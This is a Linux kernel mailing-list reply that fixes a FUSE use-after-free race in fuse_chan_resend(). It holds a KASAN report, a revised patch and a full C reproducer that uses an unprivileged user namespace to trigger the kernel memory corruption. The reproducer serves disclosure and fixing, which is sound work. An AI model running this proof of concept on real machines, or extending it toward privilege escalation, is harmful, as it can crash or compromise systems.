Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7BFC43AAF5B
	for <fuse-devel@lists.linux.dev>; Mon, 17 Aug 2026 10:26:02 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786962364; cv=none; b=TVYetlWI6rS43GzeBQEpPSjzfV4q9KMwkcV574V1oNAJvwgE89gSYIIomQbcobdaZqW99b6wlGa4aOEnjgoMfo3DHDb7YRtnNZYPrmI8caS+kWce1GPxnnoQUo+xgchx7o6gbRjBWg1406VPj5yb0CmzROEeNDVxcJ5UCnN3OSg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786962364; c=relaxed/simple;
	bh=CyiVDyw9f2D8/3sp229y2kQsu/7gXIHnesuPCe3aSYo=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version:Content-Type; b=kjur9C+OtBm1orNAwlvziSwmf6VKNDG7OV0Sz+Nl5KkvSQfdL3oJPBvufXOJ0S3v8fw9Nd8gMTyxrZtoXj0xK7vavOkzK9SKsu6AFkHxiSjiKb4kqFdI0Q9sp1lQwmPYajcVrnw/HoyGiApvXzI8MZuQL4ysF9L7znBwZWBkKFU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=GXH/bExh; arc=none smtp.client-ip=209.85.210.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="GXH/bExh"
Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-8487214ad2bso4315831b3a.1
        for <fuse-devel@lists.linux.dev>; Mon, 17 Aug 2026 03:26:02 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1786962362; x=1787567162; darn=lists.linux.dev;
        h=content-transfer-encoding:content-type:mime-version:references
         :in-reply-to:message-id:date:subject:cc:to:from:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=C3HCAsPRndvUfnAZUHBpbIN98h1zvn0t8yOUSj5Q1fI=;
        b=GXH/bExh9ciR/qk6x1yaXNhC2AkfTBkd+J0P3dPnqID9qVV26dGPNvOObQ8j8dKWRK
         Ds7LZ7EuT7Zhj8JsJWCU3xAxFxOX/Gj2sVcvnRG4e7VGN5AlPlNcdMzWzGwQ4zTEFP0z
         DOqxuT+UXo97ApW32q1gEb3pbG91M9wxquzSekWR/7itPY0MSSbqcym+iSEK622OuIxX
         /o2oa9qRnsGmGzyYpgFkKEY5/MLBdLYsK7Z6xQ/H46Foimj7O//DyV+F5xD+O/U91HIh
         2I/mVEi0I4JSBY4GHy/mkxm5UT/g9SySYl94azjPeQaM7vH4mdogynkPTKTjGK3iJbym
         4ohw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786962362; x=1787567162;
        h=content-transfer-encoding:content-type:mime-version:references
         :in-reply-to:message-id:date:subject:cc:to:from:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=C3HCAsPRndvUfnAZUHBpbIN98h1zvn0t8yOUSj5Q1fI=;
        b=H3+CgxUjGsjrSHI27qDbjzFfxvfH33SbD84Uo5vCSmKtcdHXQzyDavxNOtIOG8XoJU
         Udj+cIvhjgKMLD5pDxspauchXloP6RZnkjEkQpQOWe0EV5OVUefI2WInTDElgxKQ0MhX
         tMnqh5FMt3X5TC5u1vLSDJ7/hLctkIGAWtbJOs8vgoCOOgK5Nx9L+5vQkoqdDwWfYQzH
         ZTcCt0ZUWzJXde0lC6V7DPPk0qyBH2bHxQ5LVPZrEqXRVKmGgnCVFA0XxEQrXQZ4ERMR
         x8+/WOkR3XzOQvdtSopokOwgdS8dUVK0Tb+Bf/+ffNaDB2oMdM3J0F0tik5toJk1ciid
         h3uw==
X-Forwarded-Encrypted: i=1; AHgh+RprD3VrIsees19yADsKV3ollstZetX3mOpycb3OPFWZHRhtRiIVdDYgHIt2AU4fXM+y+OjzT97eq8z8@lists.linux.dev
X-Gm-Message-State: AOJu0Yx7Ygn+kVeRmKRvK0srhZTzmSoL9axKIyX1Z7NYBiVvCdW7M3aq
	k6jauMgnYYCdu/xyXWul1Sh7tVXRzipuODdMQE+pNkcFMz6yW3aidS/r
X-Gm-Gg: AR+sD12zeTscYhfRNooK0zdKBs4OBPCzERvBq9fU0nVwgMIY1vvNMfvZp6t604M8OZ8
	ZXM/G/bNCO8pa/ZSTfbJ4r0T0ZT/Avf0CQ0LIDRTRSMCT79LvThOFl5OPoMOfDYUCPOUA52fhLt
	KPGwXAUTZvgsNRpE9bllZDBFTJGVyraQgUq+rZaTG31PXd33GfyGlVOjqO9gEuo0nlLiseFk+aO
	WufhlUMXeW6j72edXIDbcuXnIcMV+q/ZMSSkAPPoD2G472llAj/zFB3sSc7DwOiBRIrnYr736B9
	qRR1+XkOtTJTYwfQbtQ2eNGl81TcHeitqb8yRXmyTcDiI8VZlKvDBVRCAg0t909xFmIR0bE3O+q
	mlgL1vQ9tz6BsflxYMiC32icjQlkCGnqyksQTojC8L6IUjI7SRCgJfdlThweoTEAInU/rv5YctW
	i5qNkBccDoS2rmgCZmIkENVAQPkPDPFDI7IGHRxXWzSgkXuCFCV/+wWUF1pwFEfe4=
X-Received: by 2002:a05:6a00:a118:b0:845:c5d5:3745 with SMTP id d2e1a72fcca58-84fde2bdd05mr26013760b3a.34.1786962361473;
        Mon, 17 Aug 2026 03:26:01 -0700 (PDT)
Received: from TENCENT64.site ([103.7.29.106])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-851b6fefb3asm55014b3a.53.2026.08.17.03.25.58
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 17 Aug 2026 03:26:00 -0700 (PDT)
From: Jun Yang <littleddfu@gmail.com>
X-Google-Original-From: Jun Yang <junvyyang@tencent.com>
To: Tang Yizhou <tangyeechou@gmail.com>,
	Miklos Szeredi <miklos@szeredi.hu>,
	fuse-devel@lists.linux.dev
Cc: Baokun Li <libaokun@linux.alibaba.com>,
	Jun Yang <junvyyang@tencent.com>,
	Zhao Chen <winters.zc@antgroup.com>,
	linux-kernel@vger.kernel.org,
	stable@kernel.org,
	TencentOS Corvus AI <corvus@tencent.com>
Subject: Re: [PATCH 1/2] fuse: set FR_PENDING under fiq->lock in fuse_chan_resend()
Date: Mon, 17 Aug 2026 18:25:30 +0800
Message-ID: <20260817102545.508771-1-junvyyang@tencent.com>
X-Mailer: git-send-email 2.43.7
In-Reply-To: <a9fbbe88-3d24-4ff5-9e47-89e3b8916450@gmail.com>
References: <20260804091757.503476-1-junvyyang@tencent.com>
 <20260804091757.503476-2-junvyyang@tencent.com>
 <a9fbbe88-3d24-4ff5-9e47-89e3b8916450@gmail.com>
Precedence: bulk
X-Mailing-List: fuse-devel@lists.linux.dev
List-Id: <fuse-devel.lists.linux.dev>
List-Subscribe: <mailto:fuse-devel+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:fuse-devel+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

Below are the KASAN report, the reproducer, and the revised commit message.=
=0D
The issue reproduces reliably in local testing; one decoded KASAN report fo=
llows:=0D
=0D
--- KASAN report ---=0D
=0D
  BUG: KASAN: slab-use-after-free in fuse_dev_do_read+0x1c98/0x1d40=0D
    fuse_read_interrupt                     fs/fuse/dev.c:1380 [inlined]=0D
    fuse_dev_do_read                        fs/fuse/dev.c:1567=0D
  Read of size 8 at addr ff11000103da6b20 by task poc/14975=0D
  CPU: 2 UID: 1000 PID: 14975 Comm: poc Tainted: G    B   W           7.2.0=
-rc7-clean-24ef02f934ee #2 PREEMPT(lazy)=0D
  Call Trace:=0D
   fuse_dev_do_read+0x1c98/0x1d40          fs/fuse/dev.c:1380 [inlined]=0D
                                             fs/fuse/dev.c:1567=0D
   fuse_dev_read+0x161/0x1d0               fs/fuse/dev.c:1694=0D
   vfs_read+0x700/0xab0                    fs/read_write.c:574=0D
   ksys_read+0x114/0x250                   fs/read_write.c:716=0D
   do_syscall_64+0xe0/0x5a0                arch/x86/entry/syscall_64.c:94=0D
=0D
  Allocated by task 14945:=0D
   fuse_request_alloc+0x22/0x210           fs/fuse/dev.c:48=0D
   fuse_get_req+0x1e4/0x360                fs/fuse/dev.c:130=0D
   fuse_chan_send+0x105/0x5f0              fs/fuse/dev.c:822=0D
   fuse_lookup_name+0x38d/0x830            fs/fuse/dir.c:577=0D
   vfs_statx+0xd2/0x3b0                    fs/stat.c:353=0D
=0D
  Freed by task 14945:=0D
   kmem_cache_free+0xca/0x3f0              mm/slub.c:6504=0D
   fuse_chan_send+0x438/0x5f0              fs/fuse/dev.c:839=0D
   fuse_lookup_name+0x38d/0x830            fs/fuse/dir.c:577=0D
   vfs_statx+0xd2/0x3b0                    fs/stat.c:353=0D
=0D
  The buggy address belongs to the object at ff11000103da6ae0=0D
   which belongs to the cache fuse_request of size 168=0D
=0D
--- reproducer ---=0D
=0D
#define _GNU_SOURCE=0D
#include <errno.h>=0D
#include <fcntl.h>=0D
#include <pthread.h>=0D
#include <sched.h>=0D
#include <signal.h>=0D
#include <stdatomic.h>=0D
#include <stdbool.h>=0D
#include <stdint.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/ioctl.h>=0D
#include <sys/mount.h>=0D
#include <sys/prctl.h>=0D
#include <sys/stat.h>=0D
#include <sys/wait.h>=0D
#include <unistd.h>=0D
=0D
struct fuse_in_header {=0D
	uint32_t len;=0D
	uint32_t opcode;=0D
	uint64_t unique;=0D
	uint64_t nodeid;=0D
	uint32_t uid;=0D
	uint32_t gid;=0D
	uint32_t pid;=0D
	uint16_t total_extlen;=0D
	uint16_t padding;=0D
};=0D
=0D
struct fuse_out_header {=0D
	uint32_t len;=0D
	int32_t error;=0D
	uint64_t unique;=0D
};=0D
=0D
struct fuse_init_out {=0D
	uint32_t major, minor, max_readahead, flags;=0D
	uint16_t max_background, congestion_threshold;=0D
	uint32_t max_write, time_gran;=0D
	uint16_t max_pages, map_alignment;=0D
	uint32_t flags2;=0D
	uint32_t max_stack_depth;=0D
	uint16_t request_timeout;=0D
	uint16_t unused[11];=0D
};=0D
=0D
#define FUSE_INIT 26=0D
#define FUSE_NOTIFY_RESEND 7=0D
#define FUSE_DEV_IOC_MAGIC 229=0D
#define FUSE_DEV_IOC_CLONE _IOR(FUSE_DEV_IOC_MAGIC, 0, uint32_t)=0D
#define FUSE_PARALLEL_DIROPS (1 << 18)=0D
#define FUSE_MAX_PAGES (1 << 22)=0D
=0D
enum {=0D
	VICTIM_THREADS =3D 512,=0D
	CLONE_FDS =3D 96,=0D
	RESEND_ROUNDS =3D 4,=0D
	RUN_SECONDS =3D 120,=0D
	SETTLE_US =3D 20000,=0D
};=0D
=0D
static int fuse_fd =3D -1;=0D
static atomic_int daemon_stop;=0D
static atomic_int race_start;=0D
static atomic_int parked;=0D
static long total_iterations;=0D
static long total_parked;=0D
static long total_resends;=0D
static long total_resend_failures;=0D
=0D
static long now_ms(void)=0D
{=0D
	struct timespec ts;=0D
=0D
	clock_gettime(CLOCK_MONOTONIC, &ts);=0D
	return ts.tv_sec * 1000L + ts.tv_nsec / 1000000L;=0D
}=0D
=0D
static void pin_cpu(int cpu)=0D
{=0D
	cpu_set_t set;=0D
=0D
	CPU_ZERO(&set);=0D
	CPU_SET(cpu, &set);=0D
	sched_setaffinity(0, sizeof(set), &set);=0D
}=0D
=0D
static int write_file(const char *path, const char *value)=0D
{=0D
	int fd;=0D
	ssize_t len =3D strlen(value);=0D
=0D
	fd =3D open(path, O_WRONLY);=0D
	if (fd < 0)=0D
		return -1;=0D
	if (write(fd, value, len) !=3D len) {=0D
		close(fd);=0D
		return -1;=0D
	}=0D
	close(fd);=0D
	return 0;=0D
}=0D
=0D
static void *fuse_daemon(void *unused)=0D
{=0D
	static char buf[1 << 20];=0D
=0D
	(void)unused;=0D
	pin_cpu(2);=0D
=0D
	while (!atomic_load(&daemon_stop)) {=0D
		struct fuse_in_header *in;=0D
		ssize_t n =3D read(fuse_fd, buf, sizeof(buf));=0D
=0D
		if (n < 0) {=0D
			if (errno =3D=3D EINTR || errno =3D=3D EAGAIN)=0D
				continue;=0D
			break;=0D
		}=0D
		if ((size_t)n < sizeof(*in))=0D
			continue;=0D
=0D
		in =3D (void *)buf;=0D
		if (in->opcode =3D=3D FUSE_INIT) {=0D
			struct {=0D
				struct fuse_out_header out;=0D
				struct fuse_init_out init;=0D
			} reply =3D { 0 };=0D
=0D
			reply.out.len =3D sizeof(reply);=0D
			reply.out.unique =3D in->unique;=0D
			reply.init.major =3D 7;=0D
			reply.init.minor =3D 31;=0D
			reply.init.max_readahead =3D 4096;=0D
			reply.init.flags =3D FUSE_PARALLEL_DIROPS |=0D
					   FUSE_MAX_PAGES;=0D
			reply.init.max_background =3D UINT16_MAX;=0D
			reply.init.congestion_threshold =3D UINT16_MAX;=0D
			reply.init.max_write =3D 65536;=0D
			reply.init.time_gran =3D 1;=0D
			reply.init.max_pages =3D 32;=0D
			if (write(fuse_fd, &reply, sizeof(reply)) < 0)=0D
				perror("FUSE_INIT reply");=0D
			continue;=0D
		}=0D
=0D
		/* Leave every non-INIT request in fpq->processing[]. */=0D
		atomic_fetch_add(&parked, 1);=0D
	}=0D
	return NULL;=0D
}=0D
=0D
static void wait_for_race(void)=0D
{=0D
	while (!atomic_load_explicit(&race_start, memory_order_acquire))=0D
		__asm__ __volatile__("pause" ::: "memory");=0D
}=0D
=0D
struct race {=0D
	pid_t victim;=0D
	long resends;=0D
	long failures;=0D
};=0D
=0D
static void *resend_requests(void *arg)=0D
{=0D
	struct race *race =3D arg;=0D
	struct fuse_out_header out =3D {=0D
		.len =3D sizeof(out),=0D
		.error =3D FUSE_NOTIFY_RESEND,=0D
	};=0D
	int i;=0D
=0D
	pin_cpu(0);=0D
	wait_for_race();=0D
	for (i =3D 0; i < RESEND_ROUNDS; i++) {=0D
		if (write(fuse_fd, &out, sizeof(out)) =3D=3D sizeof(out))=0D
			race->resends++;=0D
		else=0D
			race->failures++;=0D
	}=0D
	return NULL;=0D
}=0D
=0D
static void *kill_victim(void *arg)=0D
{=0D
	struct race *race =3D arg;=0D
=0D
	pin_cpu(3);=0D
	wait_for_race();=0D
	kill(race->victim, SIGKILL);=0D
	return NULL;=0D
}=0D
=0D
struct victim_arg {=0D
	int index;=0D
};=0D
=0D
static char victim_root[64];=0D
=0D
static void *victim_request(void *arg)=0D
{=0D
	struct victim_arg *victim =3D arg;=0D
	char path[96];=0D
	struct stat st;=0D
=0D
	snprintf(path, sizeof(path), "%s/f%d", victim_root, victim->index);=0D
	stat(path, &st);=0D
	for (;;)=0D
		pause();=0D
	return NULL;=0D
}=0D
=0D
static void run_victim(const char *mountpoint)=0D
{=0D
	static struct victim_arg args[VICTIM_THREADS];=0D
	pthread_attr_t attr;=0D
	pthread_t thread;=0D
	int i;=0D
=0D
	prctl(PR_SET_PDEATHSIG, SIGKILL);=0D
	snprintf(victim_root, sizeof(victim_root), "%s", mountpoint);=0D
	pthread_attr_init(&attr);=0D
	pthread_attr_setstacksize(&attr, 64 * 1024);=0D
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);=0D
	for (i =3D 0; i < VICTIM_THREADS; i++) {=0D
		args[i].index =3D i;=0D
		if (pthread_create(&thread, &attr, victim_request, &args[i]))=0D
			break;=0D
	}=0D
	pthread_attr_destroy(&attr);=0D
	for (;;)=0D
		pause();=0D
}=0D
=0D
static int wait_for_parked_requests(void)=0D
{=0D
	long start =3D now_ms();=0D
	int idle =3D 0;=0D
	int last =3D -1;=0D
=0D
	while (atomic_load(&parked) < VICTIM_THREADS &&=0D
	       now_ms() - start < 3000) {=0D
		int current =3D atomic_load(&parked);=0D
=0D
		idle =3D current =3D=3D last ? idle + 1 : 0;=0D
		last =3D current;=0D
		if (idle > 30)=0D
			break;=0D
		usleep(1000);=0D
	}=0D
	return atomic_load(&parked);=0D
}=0D
=0D
static int run_iteration(int iteration)=0D
{=0D
	char mountpoint[64];=0D
	char options[128];=0D
	int clone_fds[CLONE_FDS];=0D
	int clone_count =3D 0;=0D
	int parked_count;=0D
	int rc =3D -1;=0D
	int i;=0D
	pid_t victim =3D -1;=0D
	pthread_t daemon_thread, resend_thread, kill_thread;=0D
	bool daemon_started =3D false;=0D
	bool resend_started =3D false;=0D
	bool kill_started =3D false;=0D
	struct race race =3D { 0 };=0D
=0D
	atomic_store(&daemon_stop, 0);=0D
	atomic_store(&parked, 0);=0D
	snprintf(mountpoint, sizeof(mountpoint), "/tmp/fuse-%d", iteration);=0D
	if (mkdir(mountpoint, 0755) && errno !=3D EEXIST)=0D
		goto out;=0D
=0D
	fuse_fd =3D open("/dev/fuse", O_RDWR);=0D
	if (fuse_fd < 0)=0D
		goto out;=0D
=0D
	snprintf(options, sizeof(options),=0D
		 "fd=3D%d,rootmode=3D40000,user_id=3D0,group_id=3D0", fuse_fd);=0D
	if (mount("fuse", mountpoint, "fuse", 0, options))=0D
		goto out;=0D
=0D
	victim =3D fork();=0D
	if (!victim) {=0D
		run_victim(mountpoint);=0D
		_exit(0);=0D
	}=0D
	if (victim < 0)=0D
		goto out;=0D
=0D
	/* Cloned devices widen fuse_chan_resend()'s fch->lock section. */=0D
	for (i =3D 0; i < CLONE_FDS; i++) {=0D
		uint32_t old_fd =3D fuse_fd;=0D
		int fd =3D open("/dev/fuse", O_RDWR);=0D
=0D
		if (fd < 0)=0D
			break;=0D
		if (ioctl(fd, FUSE_DEV_IOC_CLONE, &old_fd)) {=0D
			close(fd);=0D
			break;=0D
		}=0D
		clone_fds[clone_count++] =3D fd;=0D
	}=0D
=0D
	if (pthread_create(&daemon_thread, NULL, fuse_daemon, NULL))=0D
		goto out;=0D
	daemon_started =3D true;=0D
=0D
	parked_count =3D wait_for_parked_requests();=0D
	if (iteration < 3 || !(iteration % 50))=0D
		printf("[+] it=3D%d parked=3D%d/%d clones=3D%d\n", iteration,=0D
		       parked_count, VICTIM_THREADS, clone_count);=0D
	if (parked_count < VICTIM_THREADS / 2) {=0D
		fprintf(stderr, "[!] insufficient parked requests\n");=0D
		rc =3D 0;=0D
		goto out;=0D
	}=0D
	total_parked +=3D parked_count;=0D
=0D
	race.victim =3D victim;=0D
	atomic_store(&race_start, 0);=0D
	if (pthread_create(&resend_thread, NULL, resend_requests, &race))=0D
		goto out;=0D
	resend_started =3D true;=0D
	if (pthread_create(&kill_thread, NULL, kill_victim, &race))=0D
		goto out;=0D
	kill_started =3D true;=0D
=0D
	usleep(2000);=0D
	atomic_store_explicit(&race_start, 1, memory_order_release);=0D
	pthread_join(resend_thread, NULL);=0D
	resend_started =3D false;=0D
	pthread_join(kill_thread, NULL);=0D
	kill_started =3D false;=0D
=0D
	/* Let the daemon consume a stale interrupt entry. */=0D
	usleep(SETTLE_US);=0D
	total_resends +=3D race.resends;=0D
	total_resend_failures +=3D race.failures;=0D
	rc =3D 0;=0D
=0D
out:=0D
	atomic_store_explicit(&race_start, 1, memory_order_release);=0D
	if (resend_started)=0D
		pthread_join(resend_thread, NULL);=0D
	if (kill_started)=0D
		pthread_join(kill_thread, NULL);=0D
=0D
	atomic_store(&daemon_stop, 1);=0D
	for (i =3D 0; i < clone_count; i++)=0D
		close(clone_fds[i]);=0D
	if (daemon_started) {=0D
		pthread_kill(daemon_thread, SIGUSR1);=0D
		pthread_join(daemon_thread, NULL);=0D
	}=0D
=0D
	/* Abort before waitpid(), since some victim threads wait uninterruptibly.=
 */=0D
	if (victim > 0) {=0D
		umount2(mountpoint, MNT_FORCE);=0D
		kill(victim, SIGKILL);=0D
		waitpid(victim, NULL, 0);=0D
	}=0D
	umount2(mountpoint, MNT_FORCE);=0D
	umount2(mountpoint, MNT_DETACH);=0D
	if (fuse_fd >=3D 0)=0D
		close(fuse_fd);=0D
	fuse_fd =3D -1;=0D
	rmdir(mountpoint);=0D
	return rc;=0D
}=0D
=0D
static void interrupt_read(int signal)=0D
{=0D
	(void)signal;=0D
}=0D
=0D
int main(void)=0D
{=0D
	struct sigaction action =3D { 0 };=0D
	uid_t uid =3D getuid();=0D
	gid_t gid =3D getgid();=0D
	char map[64];=0D
	long start;=0D
	int iteration;=0D
=0D
	setvbuf(stdout, NULL, _IOLBF, 0);=0D
	action.sa_handler =3D interrupt_read;=0D
	sigemptyset(&action.sa_mask);=0D
	sigaction(SIGUSR1, &action, NULL);=0D
	signal(SIGPIPE, SIG_IGN);=0D
=0D
	if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {=0D
		perror("unshare");=0D
		return 2;=0D
	}=0D
	(void)write_file("/proc/self/setgroups", "deny");=0D
	snprintf(map, sizeof(map), "0 %u 1", uid);=0D
	if (write_file("/proc/self/uid_map", map))=0D
		return 2;=0D
	snprintf(map, sizeof(map), "0 %u 1", gid);=0D
	if (write_file("/proc/self/gid_map", map))=0D
		return 2;=0D
	if (getuid())=0D
		return 2;=0D
	mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);=0D
=0D
	printf("[+] poc: %ds, %d threads, %d clones\n", RUN_SECONDS,=0D
	       VICTIM_THREADS, CLONE_FDS);=0D
	start =3D now_ms();=0D
	for (iteration =3D 0; now_ms() - start < RUN_SECONDS * 1000L;=0D
	     iteration++) {=0D
		if (run_iteration(iteration))=0D
			return 2;=0D
		total_iterations++;=0D
		if (iteration && !(iteration % 50))=0D
			printf("[+] progress: iterations=3D%ld parked=3D%ld "=0D
			       "resends=3D%ld failures=3D%ld\n",=0D
			       total_iterations, total_parked, total_resends,=0D
			       total_resend_failures);=0D
	}=0D
=0D
	printf("[+] DONE iterations=3D%ld parked=3D%ld resends=3D%ld failures=3D%l=
d\n",=0D
	       total_iterations, total_parked, total_resends,=0D
	       total_resend_failures);=0D
	return 0;=0D
}=0D
=0D
---=0D
=0D
Thanks,=0D
Jun=0D
=0D
--- commit message ---=0D
=0D
From: Jun Yang <junvyyang@tencent.com>=0D
Subject: [PATCH v2 1/2] fuse: set FR_PENDING under fiq->lock in=0D
 fuse_chan_resend()=0D
=0D
fuse_remove_pending_req() checks FR_PENDING while holding fiq->lock and=0D
removes req->list when the bit is set.=0D
=0D
fuse_chan_resend() first moves requests from fpq->processing to the=0D
stack-local to_queue list.  It then drops the queue locks and sets=0D
FR_PENDING before taking fiq->lock and moving the requests to=0D
fiq->pending.=0D
=0D
This leaves the following race:=0D
=0D
  fuse_chan_resend()              request waiter=0D
=0D
  set_bit(FR_PENDING)=0D
                                   spin_lock(fiq->lock)=0D
                                   test FR_PENDING=0D
                                   list_del(req->list)=0D
                                   __fuse_put_request(req)=0D
  access req / walk to_queue=0D
=0D
Take fiq->lock before setting FR_PENDING and keep it held until the=0D
requests have been added to fiq->pending.  Relative to=0D
fuse_remove_pending_req(), publishing FR_PENDING and changing the request's=
=0D
list ownership are then one fiq->lock-protected transition.  If fiq is=0D
already disconnected, end the requests without setting FR_PENDING.=0D
=0D
Fixes: 760eac73f9f6 ("fuse: Introduce a new notification type for resend pe=
nding requests")=0D
Cc: stable@kernel.org=0D
Reported-by: TencentOS Corvus AI <corvus@tencent.com>=0D
Assisted-by: tencentos-corvus-ai:kimi-k3=0D
Signed-off-by: Jun Yang <junvyyang@tencent.com>=0D
---=0D
 fs/fuse/dev.c | 24 ++++++++++--------------=0D
 1 file changed, 10 insertions(+), 14 deletions(-)=0D
=0D
diff --git a/fs/fuse/dev.c b/fs/fuse/dev.c=0D
index 5763a7cd3b37..e62c7ed8bcf4 100644=0D
--- a/fs/fuse/dev.c=0D
+++ b/fs/fuse/dev.c=0D
@@ -1781,26 +1781,22 @@ void fuse_chan_resend(struct fuse_chan *fch)=0D
 	}=0D
 	spin_unlock(&fch->lock);=0D
 =0D
-	list_for_each_entry_safe(req, next, &to_queue, list) {=0D
-		set_bit(FR_PENDING, &req->flags);=0D
-		clear_bit(FR_SENT, &req->flags);=0D
-		/* mark the request as resend request */=0D
-		req->in.h.unique |=3D FUSE_UNIQUE_RESEND;=0D
-	}=0D
-=0D
 	spin_lock(&fiq->lock);=0D
 	if (!fiq->connected) {=0D
 		spin_unlock(&fiq->lock);=0D
-		list_for_each_entry(req, &to_queue, list)=0D
-			clear_bit(FR_PENDING, &req->flags);=0D
 		fuse_dev_end_requests(&to_queue);=0D
 		return;=0D
 	}=0D
-	/*=0D
-	 * Remove interrupt entries for resent requests to prevent stale=0D
-	 * intr_entry on fiq->interrupts after the request is re-queued.=0D
-	 */=0D
-	list_for_each_entry(req, &to_queue, list) {=0D
+	list_for_each_entry_safe(req, next, &to_queue, list) {=0D
+		/* must be set under fiq->lock, see fuse_remove_pending_req() */=0D
+		set_bit(FR_PENDING, &req->flags);=0D
+		clear_bit(FR_SENT, &req->flags);=0D
+		/* mark the request as resend request */=0D
+		req->in.h.unique |=3D FUSE_UNIQUE_RESEND;=0D
+		/*=0D
+		 * Remove interrupt entries for resent requests to prevent stale=0D
+		 * intr_entry on fiq->interrupts after the request is re-queued.=0D
+		 */=0D
 		if (test_bit(FR_INTERRUPTED, &req->flags))=0D
 			list_del_init(&req->intr_entry);=0D
 	}=0D
-- =0D
2.43.7=0D
